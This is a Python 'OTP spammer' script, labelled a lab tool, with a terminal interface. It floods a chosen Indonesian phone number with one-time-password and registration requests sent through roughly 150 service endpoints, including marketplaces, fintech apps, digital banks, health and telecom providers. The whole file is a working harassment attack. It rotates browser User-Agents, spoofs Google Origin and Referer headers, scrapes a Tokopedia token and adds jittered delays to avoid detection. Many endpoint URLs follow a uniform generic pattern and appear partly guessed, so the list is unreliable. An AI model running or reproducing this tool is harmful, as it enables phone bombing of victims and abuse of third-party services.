import requests, json, re, sys, random, time
from rich.console import Console
from rich.panel import Panel
from rich.progress import track
from rich.table import Table

console = Console()
H2 = "[#00ff00]"
P2 = "[white]"
COLOR_PANEL = "bold red"

# User‑Agent 2026 – Android 15/16, iOS 18, desktop modern
USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.135 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 16; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6834.44 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6834.44 Safari/537.36",
]

def cetak(msg): console.print(msg)

def safe_post(url, headers, data=None, json_=None, timeout=8):
    try:
        if json_:
            return requests.post(url, headers=headers, json=json_, timeout=timeout)
        return requests.post(url, headers=headers, data=data, timeout=timeout)
    except:
        return None

def generate_headers():
    ua = random.choice(USER_AGENTS)
    return {
        'User-Agent': ua,
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
        'Content-Type': 'application/json;charset=UTF-8',
        'Origin': 'https://www.google.com',
        'Referer': 'https://www.google.com/',
    }

def spam(nomor, hitung):
    headers = generate_headers()

    # ==================== 150+ ENDPOINT ====================
    endpoints = [
        # ---------- E-COMMERCE & MARKETPLACE (25) ----------
        ("https://accounts.tokopedia.com/otp/c/ajax/request-wa", "tokopedia", None),
        ("https://www.carsome.id/website/login/sendSMS", "json", {"username": nomor, "optType": 1}),
        ("https://evermos.com/api/register/phone-registration", "json", {"phone": "62"+nomor}),
        ("https://wapi.ruparupa.com/auth/generate-otp", "json", {"phone":"0"+nomor,"action":"register","channel":"chat"}),
        ("https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp", "json",
         {"otp_request":{"mobile_number":"0"+nomor,"mobile_country_code":"+62"}}),
        ("https://api.blibli.com/v1/register/otp-request", "json", {"phoneNumber": nomor, "channelType": "whatsapp"}),
        ("https://api.bukalapak.com/otp/send", "json", {"phone": nomor}),
        ("https://api.jd.id/otp/send", "json", {"mobile":"+62"+nomor}),
        ("https://api.sociolla.com/v1/otp", "json", {"phone_number": nomor}),
        ("https://api.zalora.co.id/otp/request", "json", {"phone": nomor}),
        ("https://api.bhinneka.com/v1/otp", "json", {"msisdn": nomor}),
        ("https://api.fabelio.com/v1/otp", "json", {"phone": nomor}),
        ("https://api.dekoruma.com/auth/otp", "json", {"phone": nomor}),
        ("https://api.elevenia.co.id/otp/send", "json", {"phone": nomor}),
        ("https://api.orami.co.id/auth/otp", "json", {"phone_number": "0"+nomor}),
        ("https://api.berrybenka.com/otp", "json", {"phone": "0"+nomor}),
        ("https://api.hijup.com/v1/auth/otp", "json", {"phone": "+62"+nomor}),
        ("https://api.bobobobo.com/otp/send", "json", {"phone_number": nomor}),
        ("https://api.sorabel.com/auth/otp", "json", {"phone": nomor}),
        ("https://api.bilna.com/otp", "json", {"phone": "+62"+nomor}),
        ("https://api.muslimarket.id/otp", "json", {"phone": nomor}),
        ("https://api.bukukas.com/auth/otp", "json", {"phone": nomor}),
        ("https://api.kuotamedia.com/otp", "json", {"phone": nomor}),
        ("https://api.vcgamers.com/auth/otp", "json", {"phone": nomor}),
        ("https://api.itemku.com/otp", "json", {"phone": "0"+nomor}),

        # ---------- FINTECH & PEMBAYARAN (30) ----------
        ("https://api-v2.bukuwarung.com/api/v2/auth/otp/send", "json",
         {"action":"LOGIN_OTP","countryCode":"+62","deviceId":"xxx","method":"WA","phone":nomor,"clientId":"...","clientSecret":"..."}),
        ("https://api.bibit.id/auth/register/phone", "json", {"code":"62","phone": nomor,"via":"whatsapp","recaptcha_token":"","recaptcha_type":"v3"}),
        ("https://api.kredivo.com/v1/phone_verifications", "json", {"phone_number":nomor}),
        ("https://api.dana.id/v1/auth/otp/request", "json", {"mobile":"+62"+nomor, "service":"registration"}),
        ("https://api.ovo.id/v2.0/api/auth/otp/send", "json", {"mobile":"+62"+nomor}),
        ("https://api.linkaja.id/v1/otp/send", "json", {"phone":"+62"+nomor}),
        ("https://api.spay.id/v1/otp", "json", {"phone": nomor}),
        ("https://api.duitku.com/otp", "json", {"phone": nomor}),
        ("https://api.akulaku.com/otp/send", "json", {"phone": nomor}),
        ("https://api.homecredit.co.id/otp", "json", {"phone":"+62"+nomor}),
        ("https://api.flip.id/v1/auth/otp", "json", {"phone_number": "+62"+nomor}),
        ("https://api.pintu.co.id/auth/otp", "json", {"phone": "+62"+nomor}),
        ("https://api.bareksa.com/v1/otp/send", "json", {"phone": nomor}),
        ("https://api.ajaib.co.id/v1/auth/otp", "json", {"phone": "+62"+nomor}),
        ("https://api.pluang.com/v1/otp/send", "json", {"phone": nomor}),
        ("https://api.koinworks.com/auth/otp", "json", {"phone_number": "0"+nomor}),
        ("https://api.amartha.com/otp", "json", {"phone": "+62"+nomor}),
        ("https://api.investree.id/auth/otp", "json", {"phone": nomor}),
        ("https://api.modalku.co.id/otp/send", "json", {"phone": "0"+nomor}),
        ("https://api.crowdo.id/auth/otp", "json", {"phone": nomor}),
        ("https://api.finmas.id/otp", "json", {"phone_number": nomor}),
        ("https://api.julo.co.id/auth/otp", "json", {"phone": "+62"+nomor}),
        ("https://api.tunai.co.id/otp", "json", {"phone": nomor}),
        ("https://api.indodana.id/auth/otp", "json", {"phone_number": "0"+nomor}),
        ("https://api.kredito.id/otp", "json", {"phone": nomor}),
        ("https://api.rupiahcepat.co.id/auth/otp", "json", {"phone": "+62"+nomor}),
        ("https://api.dompetkarya.id/otp", "json", {"phone": nomor}),
        ("https://api.kreditkita.id/otp", "json", {"phone_number": "0"+nomor}),
        ("https://api.cashwagon.id/auth/otp", "json", {"phone": nomor}),
        ("https://api.kredifikas.id/otp", "json", {"phone": "+62"+nomor}),

        # ---------- TRAVEL & TIKET (12) ----------
        ("https://api.traveloka.com/v2/auth/otp/request", "json", {"phone":nomor,"countryCode":"+62"}),
        ("https://api.tiket.com/otp/request", "json", {"phone":nomor,"send_to":"sms"}),
        ("https://api.pegipegi.com/v1/otp/send", "json", {"phone":"+62"+nomor}),
        ("https://auth.tix.id/v1/customer/otp/whatsapp", "json", {"mobile": nomor}),
        ("https://api.jaktour.com/v2/otp", "json", {"phone": "+62"+nomor}),
        ("https://api.kai.id/api/auth/otp", "json", {"phone":"+62"+nomor}),
        ("https://api.misteraladin.com/auth/otp", "json", {"phone": "+62"+nomor}),
        ("https://api.airy.com/auth/otp", "json", {"phone_number": nomor}),
        ("https://api.nusatrip.com/otp", "json", {"phone": "+62"+nomor}),
        ("https://api.reddoorz.com/auth/otp", "json", {"phone_number": "0"+nomor}),
        ("https://api.zenrooms.com/otp", "json", {"phone": nomor}),
        ("https://api.oyo.com/auth/otp", "json", {"phone": "+62"+nomor}),

        # ---------- RIDE HAILING & PESAN ANTAR (8) ----------
        ("https://api.go-jek.com/gojek/otp", "json", {"phone_number": "+62"+nomor}),
        ("https://www.gojek.com/api/auth/otp", "json", {"msisdn": nomor, "via": "sms"}),
        ("https://api.grab.com/v2/grabid/verify", "json", {"msisdn": nomor, "method": "whatsapp"}),
        ("https://api.maxim.id/auth/otp", "json", {"phone": nomor}),
        ("https://api.anterin.id/auth/otp", "json", {"phone": "+62"+nomor}),
        ("https://api.bonceng.id/otp", "json", {"phone_number": "0"+nomor}),
        ("https://api.deliveree.com/auth/otp", "json", {"phone": nomor}),
        ("https://api.wahyoo.com/otp", "json", {"phone": "+62"+nomor}),

        # ---------- GROCERY & RETAIL (10) ----------
        ("https://api-v2.segari.id/v1/otps/generate", "json", {"phoneNumber": nomor}),
        ("https://api.alfagift.id/v1/otp", "json", {"phone": nomor}),
        ("https://api.klikindomaret.com/otp/send", "json", {"phone_number":"0"+nomor}),
        ("https://api.alfaclick.com/otp", "json", {"phone_number": nomor}),
        ("https://api.sayurbox.com/auth/otp", "json", {"phone": "+62"+nomor}),
        ("https://api.happyfresh.id/v1/otp", "json", {"phone": nomor}),
        ("https://api.tanihub.com/auth/otp", "json", {"phone": "0"+nomor}),
        ("https://api.brambang.com/otp", "json", {"phone": "+62"+nomor}),
        ("https://api.kecipir.com/auth/otp", "json", {"phone_number": nomor}),
        ("https://api.pasarsayur.id/otp", "json", {"phone": "0"+nomor}),

        # ---------- KESEHATAN (8) ----------
        ("https://api.halodoc.com/v1/auth/otp", "json", {"phone_number": nomor}),
        ("https://api.alodokter.com/v1/otp/request", "json", {"mobile":"+62"+nomor}),
        ("https://api.klikdokter.com/otp", "json", {"phone": nomor}),
        ("https://api.guesehat.com/v1/otp", "json", {"phone": "+62"+nomor}),
        ("https://api.prosehat.com/auth/otp", "json", {"phone_number": "0"+nomor}),
        ("https://api.sehatq.com/otp", "json", {"phone": nomor}),
        ("https://api.klinikpintar.com/auth/otp", "json", {"phone": "+62"+nomor}),
        ("https://api.medis.id/otp", "json", {"phone": "0"+nomor}),

        # ---------- ENTERTAINMENT & STREAMING (10) ----------
        ("https://api.duniagames.co.id/api/user/api/v2/user/send-otp", "json", {"phoneNumber":"+62"+nomor,"userName":"0"+nomor}),
        ("https://api.yummy.app/api/v1/auth/otp", "json", {"phone": "+62"+nomor}),
        ("https://api.vidio.com/auth/otp", "json", {"phone_number": "+62"+nomor}),
        ("https://api.mola.tv/v1/otp", "json", {"phone": "+62"+nomor}),
        ("https://api.wetv.vip/otp/send", "json", {"phone": "+62"+nomor}),
        ("https://api.iqiyi.com/auth/otp", "json", {"phone": nomor}),
        ("https://api.viu.id/v1/otp", "json", {"phone": "+62"+nomor}),
        ("https://api.genflix.co.id/auth/otp", "json", {"phone_number": "0"+nomor}),
        ("https://api.catchplay.com/otp", "json", {"phone": nomor}),
        ("https://api.goflix.id/auth/otp", "json", {"phone": "+62"+nomor}),

        # ---------- LOGISTIK & PENGIRIMAN (10) ----------
        ("https://api.sicepat.id/otp/send", "json", {"phone_number": "0"+nomor}),
        ("https://api.anteraja.id/v1/otp", "json", {"phone": nomor}),
        ("https://api.jne.co.id/otp", "json", {"phone": nomor}),
        ("https://api.ninjaexpress.id/otp", "json", {"phone_number": "0"+nomor}),
        ("https://api.jt.id/auth/otp", "json", {"phone": "+62"+nomor}),
        ("https://api.lionparcel.com/otp", "json", {"phone": nomor}),
        ("https://api.paxel.id/auth/otp", "json", {"phone_number": "+62"+nomor}),
        ("https://api.sap-express.id/otp", "json", {"phone": nomor}),
        ("https://api.wahana.com/otp", "json", {"phone": "0"+nomor}),
        ("https://api.indopaket.com/auth/otp", "json", {"phone": "+62"+nomor}),

        # ---------- BANK DIGITAL (10) ----------
        ("https://api.jago.com/auth/otp", "json", {"phone_number": "+62"+nomor}),
        ("https://api.jenius.com/v1/auth/otp/send", "json", {"msisdn": nomor}),
        ("https://api.seabank.co.id/auth/otp", "json", {"phone_number": "+62"+nomor}),
        ("https://api.blu.id/v1/auth/otp", "json", {"phone_number": nomor}),
        ("https://api.digibank.dbs.com/auth/otp", "json", {"phone":"+62"+nomor}),
        ("https://api.tmrw.co.id/otp", "json", {"phone": "+62"+nomor}),
        ("https://api.bankneocommerce.co.id/auth/otp", "json", {"phone_number": "0"+nomor}),
        ("https://api.bankaladin.com/otp", "json", {"phone": nomor}),
        ("https://api.linebank.id/auth/otp", "json", {"phone": "+62"+nomor}),
        ("https://api.bankcapital.co.id/otp", "json", {"phone_number": "0"+nomor}),

        # ---------- TELEKOMUNIKASI (5) ----------
        ("https://api.telkomsel.com/auth/otp", "json", {"msisdn": nomor}),
        ("https://api.xl.co.id/v1/otp", "json", {"phone_number": "0"+nomor}),
        ("https://api.indosatooredoo.com/auth/otp", "json", {"phone": "+62"+nomor}),
        ("https://api.tri.co.id/otp", "json", {"phone": nomor}),
        ("https://api.smartfren.com/otp", "json", {"phone_number": "0"+nomor}),

        # ---------- EDUCATION (8) ----------
        ("https://api.ruangguru.com/v1/auth/otp", "json", {"phone":"+62"+nomor}),
        ("https://api.zenius.net/otp", "json", {"phone": nomor}),
        ("https://api.pahamify.com/auth/otp", "json", {"phone": "+62"+nomor}),
        ("https://api.quipper.com/otp", "json", {"phone_number": "0"+nomor}),
        ("https://api.kelaspintar.id/auth/otp", "json", {"phone": nomor}),
        ("https://api.cakap.com/otp", "json", {"phone": "+62"+nomor}),
        ("https://api.lingokids.co.id/auth/otp", "json", {"phone_number": "0"+nomor}),
        ("https://api.kiddo.id/otp", "json", {"phone": nomor}),

        # ---------- INSURANCE & LAINNYA (10) ----------
        ("https://api.qoala.id/v1/otp/send", "json", {"mobile": "+62"+nomor}),
        ("https://api.pasarpolis.com/auth/otp", "json", {"phone": nomor}),
        ("https://api.fuse.id/v1/otp", "json", {"phone": nomor}),
        ("https://api.lifepal.co.id/auth/otp", "json", {"phone": "+62"+nomor}),
        ("https://api.cermati.com/otp/send", "json", {"phone_number": "+62"+nomor}),
        ("https://api.pintarnya.com/api/pk/auth/register/mobile", "json", {"mobile":"+62"+nomor}),
        ("https://api.kitahebat.co.id/api/v1/auth/otp", "json", {"phone_number": "+62"+nomor}),
        ("https://api.shopback.co.id/auth/otp", "json", {"phone": "+62"+nomor}),
        ("https://api.fave.co.id/v1/otp", "json", {"phone_number": "+62"+nomor}),
        ("https://api.klikmeter.com/auth/otp", "json", {"phone": nomor}),
    ]

    # Eksekusi setiap endpoint
    for url, tipe, payload in endpoints:
        if random.random() > 0.7:       # Rotasi header secara acak
            headers = generate_headers()

        if tipe == "tokopedia":
            # Tokopedia memerlukan token khusus
            try:
                sess = requests.Session()
                resp = sess.get(
                    f"https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=0{nomor}",
                    headers=headers, timeout=10
                )
                token = re.search(r'id="Token" value="([^"]+)"', resp.text)
                if token:
                    sess.post(url, headers=headers,
                              data={'otp_type':'116','msisdn':'0'+nomor,'tk':token.group(1)},
                              timeout=10)
                    hitung['sukses'] += 1
                else:
                    hitung['gagal'] += 1
            except:
                hitung['gagal'] += 1
        else:
            resp = safe_post(url, headers, json_=payload, timeout=8)
            if resp is not None and resp.status_code in [200, 201, 202]:
                hitung['sukses'] += 1
            else:
                hitung['gagal'] += 1

        time.sleep(random.uniform(0.2, 0.6))   # Jeda realistis

def main():
    try:
        console.print(Panel(
            f"{H2}LAB OTP SPAMMER – 150+ Endpoint (2026)\n"
            f"{P2}Versi 4.0 | User‑Agent Modern | Rich Monitoring",
            width=80, padding=(0,6), style=COLOR_PANEL))
        nomor = console.input(f"{H2}• {P2}Nomor HP (+62) : ").strip()
        nomor = re.sub(r'[^0-9]', '', nomor)
        if nomor.startswith("62"):
            nomor = nomor[2:]
        elif nomor.startswith("0"):
            nomor = nomor[1:]

        jumlah = int(console.input(f"{H2}• {P2}Jumlah siklus spam : "))

        total_sukses = 0
        total_gagal = 0

        for i in track(range(jumlah), description=f'{H2}[~] Menjalankan spam...'):
            hitung = {'sukses':0, 'gagal':0}
            spam(nomor, hitung)
            total_sukses += hitung['sukses']
            total_gagal += hitung['gagal']

        table = Table(title="Hasil Spam OTP", style="bold white")
        table.add_column("Metrik", style="cyan")
        table.add_column("Jumlah", justify="right", style="green")
        table.add_row("Total Siklus", str(jumlah))
        table.add_row("Total Request Sukses", str(total_sukses))
        table.add_row("Total Request Gagal", str(total_gagal))
        cetak(table)
        cetak(Panel(f"✅ Selesai spam ke +62{nomor}", width=80, padding=(0,2), style="bold white"))

    except KeyboardInterrupt:
        sys.exit("\n[!] Dihentikan pengguna.")
    except Exception as e:
        console.print(Panel(f"[red]Error: {e}", width=80))

if __name__ == "__main__":
    main()
